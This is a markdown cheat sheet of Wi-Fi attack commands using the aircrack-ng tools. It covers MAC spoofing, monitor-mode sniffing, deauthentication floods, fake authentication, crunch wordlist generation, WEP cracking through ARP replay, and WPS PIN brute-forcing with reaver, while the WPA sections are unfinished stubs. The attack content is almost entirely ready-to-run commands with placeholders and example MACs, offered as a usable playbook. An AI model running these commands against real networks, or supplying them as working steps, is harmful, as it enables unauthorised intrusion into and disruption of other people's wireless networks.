# Network Hacking Main Page

- [Changing MAC Address](#mac)
- [WIFI Sniffing](#snif)
- [De-auth Attack](#deauth)
- [Fake-auth Attack](#fakeauth)
- [Creating a Wordlist](#wordlist)
- [WIFI Password Craking](#wifipasscrack)
  - [WEP](#wep)
  - [WPS](#wps)
  - [WAP](#wap)
  - [WAP2](#wap2)

## Show available INTERFACE info
```bash
ifconfig
iwconfig
```

<a name="mac"/>

## Changing MAC adresse

**DESC** : *Change MAC adresse*

MAC = Media Access Control

```bash
ifconfig <INTERFACE> down
ifconfig <INTERFACE> hw ether <MAC_ADDRESS> # hw for hardware
ifconfig <INTERFACE> up
```

<a name="changewirelessmode"/>

## Changing wireless mode to Monitor

```bash
# step 1
ifconfig <INTERFACE> down
# step 2
airmon-ng check kill
# step 3
iwconfig <INTERFACE> mode monitor
# step 4
ifconfig <INTERFACE> up
```

<a name="snif"/>

## WIFI Sniffing

**DESC** : *`aerodump-ng` is a packet sniffer program*
 - Must have a wifi key in wireless `monitor mode`
 - Use to capture packets within range
 - Display detailed info about networks
 - part of "aircrak-ng" suit

**USAGE** : `airodump-ng <INTERFACE>`

1. Must [change wireless mode](#changewirelessmode) : Managed to Monitor
2. Run `airodump-ng`

options :
- `--bssid <MAC_ADDRESS>` : Select MAC adresse to sniff
  - example
    - ```bash
      airodump-ng --bssid 00:11:22:33:44:55 --channel 2 --write save mon0`
      ```
- `--write <FILE_NAME>` : Save the sniffing to a file
  - Use [Wireshark]() to read the `.cap` file
- `--channel <CHANNEL_ID>`: Select channel 
- `--band` : Select frequency
  - "a" : use 5Gz only
  - "bg" : use 2.4Gz only
  - "n" : use both
  - "ac" : use lower than 6Gz
  -  example
     - ```bash
        airodump-ng --band abg mon0
        ```

Simple sniffing 2.4Gz
```bash
airodump-ng <INTERFACE>
```

<a name="deauth"/>

## De-auth Attack with `aireplay-ng`

**USAGE** : `aireplay-ng --deauth <#DEAUTH_PACKETS> -a <NETWORK_MAC> -c <TARGET_MAC> <INTERFACE>`

1. Run `aerodump-ng`
2. Run `aireplay-ng`

example : 
```bash
aireplay-ng --deauth 100000 -a 11:22:33:44:55:66 -c 00:11:22:33:44:55 mon0
```

<a name="fakeauth" />

## Fake-auth Attack with `aireplay-ng`

**USAGE** : `aireplay-ng --fakeauth <#FAKEAUTH_PACKETS> -a <NETWORK_MAC> -h <INTERFACE_MAC> <INTERFACE>`

example:
```bash
aireplay-ng --fakeauth 0 -a 11:22:33:44:55:66 -h 00:11:22:33:44:55 mon0
```

<a name="wordlist"/>

## Wordlist with `crunch`

**Desc** : Wordlist are used to bruteforce password, here is how to create our own wordlist

**USAGE** : `crunch <MIN> <MAX> <CHARACTERS> -t <PATERN> -o <FILE_NAME>`

example
```bash
crunch 6 8 123abc$ -t a@@@@b -o wordlist.txt
```

<a name="wifipasscrack"/>

## WIFI password cracking

<a name="wep"/>

### WEP

**DESC** : WEP is a very basics RC4 encryption method. that use a random Initialisation Vector (IV) of only from 24 bits to 128 bits\
WEP = Wired Equivalent Privacy\
`IV + Password = Key Stream`\
In order to get the Password we will perform statistics on packets\
IV is added at the beginning of each packet send to the router

#### If network is busy

1. [Change wireless mode](#changewirelessmode) to monitor
2. [Sniff packets](#snif) with on a specific bssid and channel (Capture a lot of `#Data` / IVs) and save them in a file <FILE_NAME>.cap
3. Analyse captured IVs by running
  ```bash
  aircrack-ng <FILE_NAME>.cap
  ```

#### If network is not busy

We will perform an association (not connection) to force the network to send IVs

1. [Change wireless mode](#changewirelessmode) to monitor
2. [Sniff packets](#snif) with on a specific bssid and channel (Capture a lot of `#Data` / IVs) and save them in a file <FILE_NAME>.cap
3. Do one [Fake Authentification Attack](#fakeauth)
4. Wait for an `ARP` packet, and use it to force network to create new IVs
    ```bash
    aireplay-ng --arpreplay -b <NETWORK_MAC> -h <INTERFACE_MAC> <INTERFACE>
    ```
5. Then Analyse captured IVs by running
    ```bash
    aircrack-ng <FILE_NAME>.cap
    ```
   
<a name="wps"/>

### WPS

**DESC** : WPS is not a type of encryption but it's a method to connect without entering password\
Used by some printer and easy connect with a WPS button on the router\
We will bruteforce the password

1. [Change wireless mode](#changewirelessmode) to monitor
2. Router must be on WPS not be configured "Push Button" or "PBC", only way to know is to test
3. List WPS available
    ```bash
     wash --interface <INTERFACE>
     ```
4. Do Some (30) [Fake Authentification Attack](#fakeauth)
5. Bruteforce with `reaver`
    ```bash
    reaver --bssid <NETWORK_MAC> --channel <CHANNEL> --interface <INTERFACE> -vvv --no-associate
    ```

<a name="wap"/>

### WAP

TODO

<a name="wap2"/>

### WAP2

TODO
